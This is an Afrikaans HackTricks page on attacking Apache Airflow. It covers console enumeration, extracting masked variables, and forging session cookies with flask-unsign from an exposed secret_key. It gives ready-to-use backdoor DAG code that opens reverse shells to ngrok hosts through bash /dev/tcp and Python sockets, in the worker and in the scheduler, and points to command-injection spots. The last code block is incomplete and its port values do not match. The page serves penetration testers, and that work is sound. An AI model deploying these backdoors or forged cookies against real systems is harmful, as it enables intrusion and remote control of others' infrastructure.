# Apache Airflow Sekuriteit

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basiese Inligting

[**Apache Airflow**](https://airflow.apache.org) dien as 'n platform vir **die orkestrering en skedulering van data pyplyne of werkstrome**. Die term "orkestrering" in die konteks van data pyplyne dui op die proses van die re√´l, ko√∂rdinering en bestuur van komplekse data werkstrome wat afkomstig is van verskeie bronne. Die prim√™re doel van hierdie georkestreerde data pyplyne is om verwerkte en verbruikbare datastelle te voorsien. Hierdie datastelle word wyd gebruik deur 'n verskeidenheid van toepassings, insluitend maar nie beperk tot besigheidsintelligensie gereedskap, data wetenskap en masjienleermodelle, wat almal fundamenteel is vir die werking van groot data toepassings.

Basies sal Apache Airflow jou toelaat om **die uitvoering van kode te skeduleer wanneer iets** (gebeurtenis, cron) **gebeur**.

## Plaaslike Laboratorium

### Docker-Compose

Jy kan die **docker-compose konfigurasie l√™er van** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) gebruik om 'n volledige Apache Airflow docker-omgewing te begin. (As jy op MacOS is, maak seker om ten minste 6GB RAM aan die docker VM te gee).

### Minikube

Een maklike manier om **Apache Airflow te hardloop** is om dit **met minikube te hardloop**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfigurasie

Airflow kan **sensitiewe inligting** in sy konfigurasie stoor of swak konfigurasies kan gevind word:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Voordat jy Airflow aanval, moet jy verstaan **hoe toestemmings werk**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Aanvalle

### Webkonsol Enumerasie

As jy **toegang tot die webkonsol** het, kan jy moontlik toegang h√™ tot een of al die volgende inligting:

* **Veranderlikes** (Aangepaste sensitiewe inligting kan hier gestoor word)
* **Verbindings** (Aangepaste sensitiewe inligting kan hier gestoor word)
* Toegang tot hulle in `http://<airflow>/connection/list/`
* [**Konfigurasie**](./#airflow-configuration) (Sensitiewe inligting soos die **`secret_key`** en wagwoorde kan hier gestoor word)
* Lys **gebruikers & rolle**
* **Kode van elke DAG** (wat interessante inligting kan bevat)

### Haal Veranderlike Waardes op

Veranderlikes kan in Airflow gestoor word sodat die **DAGs** hul waardes kan **bereik**. Dit is soortgelyk aan geheime van ander platforms. As jy **genoeg toestemmings** het, kan jy hulle in die GUI bereik by `http://<airflow>/variable/list/`.\
Airflow sal standaard die waarde van die veranderlike in die GUI wys, maar volgens [**hierdie**](https://marclamberti.com/blog/variables-with-apache-airflow/) is dit moontlik om 'n **lys van veranderlikes** in te stel waarvan die **waarde** as **asteriskte** in die **GUI** sal verskyn.

![](<../../.gitbook/assets/image (164).png>)

Nietemin kan hierdie **waardes** steeds **opgehaal** word via **CLI** (jy moet DB-toegang h√™), **arbitr√™re DAG**-uitvoering, **API** wat die veranderlikes-eindpunt benader (die API moet geaktiveer wees), en **selfs die GUI self!**\
Om toegang tot daardie waardes vanuit die GUI te verkry, **kies die veranderlikes** wat jy wil bereik en **klik op Handelinge -> Uitvoer**.\
'n Ander manier is om 'n **bruteforce** uit te voer vir die **verborge waarde** deur die **soekfiltering** te gebruik totdat jy dit kry:

![](<../../.gitbook/assets/image (152).png>)

### Voorreg-Opgradering

As die **`expose_config`**-konfigurasie op **Waar** ingestel is, kan vanaf die **rol Gebruiker** en **daarbo** die **konfig in die web** **gelees** word. In hierdie konfigurasie verskyn die **`secret_key`**, wat beteken enige gebruiker met hierdie geldige sleutel kan **sy eie ondertekende koekie skep om enige ander gebruikersrekening te simuleer**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Agterdeur (RCE in Airflow werker)

Indien jy **skryftoegang** het tot die plek waar die **DAGs gestoor word**, kan jy net **een skep** wat vir jou 'n **omgekeerde skaal** sal stuur.\
Let wel dat hierdie omgekeerde skaal binne 'n **airflow werker houer** uitgevoer sal word:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Agterdeur (RCE in Airflow-skeduleerder)

Indien jy iets instel om **uitgevoer te word in die hoof van die kode**, sal dit op die oomblik van hierdie skrywe **uitgevoer word deur die skeduleerder** na 'n paar sekondes nadat dit binne die DAG se vouer geplaas is.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG Skepping

Indien jy daarin slaag om **'n masjien binne die DAG-kluster te kompromiteer**, kan jy nuwe **DAG-skripte** in die `dags/`-vouer skep en hulle sal **gerepliseer word in die res van die masjiene** binne die DAG-kluster.

### DAG Kode-inspuiting

Wanneer jy 'n DAG vanaf die GUI uitvoer, kan jy **argumente daaraan deurgee**.\
Daarom, as die DAG nie behoorlik gekodeer is nie, kan dit **kwesbaar wees vir Bevel-inspuiting.**\
Dit is wat in hierdie CVE gebeur het: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Al wat jy moet weet om te **begin soek na bevel-inspuitings in DAGs** is dat **parameters** **toegang vind** met die kode **`dag_run.conf.get("param_name")`**.

Verder kan dieselfde kwesbaarheid voorkom met **veranderlikes** (let daarop dat met genoeg regte jy die waarde van die veranderlikes in die GUI kan **beheer**). Veranderlikes word **toegang met**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Indien hulle byvoorbeeld binne 'n bash-opdrag gebruik word, kan jy 'n opdraginspuiting uitvoer.

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
